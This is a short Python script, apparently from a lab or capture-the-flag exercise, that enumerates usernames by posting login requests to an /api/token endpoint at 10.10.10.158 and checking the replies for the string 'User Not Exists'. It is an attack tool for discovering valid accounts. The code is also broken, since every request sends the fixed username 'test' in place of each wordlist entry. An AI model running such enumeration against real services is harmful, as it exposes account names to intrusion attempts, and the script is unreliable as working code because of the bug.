import requests
import sys

def usage():
    print("./enum_user.py <WORDLIST>")
    exit()

def load_usernames(filePath):

    with open(filePath) as file:
        usernames = file.readlines()

    usernames = list(map(str.strip, usernames))
    return usernames

if len(sys.argv) != 2:
    usage()

url = "http://10.10.10.158/api/token"

usernames = load_usernames(sys.argv[1])

error_str = "\"User Not Exists\""

for u in usernames:
    print("[*] Trying: ", u, end=" " * 25 + "\r")
    data = {"UserName": "test", "Password": "Pass"}
    r = requests.post(url, data=data)
    if not error_str in r.text:
        print("[!] Username found: ", u)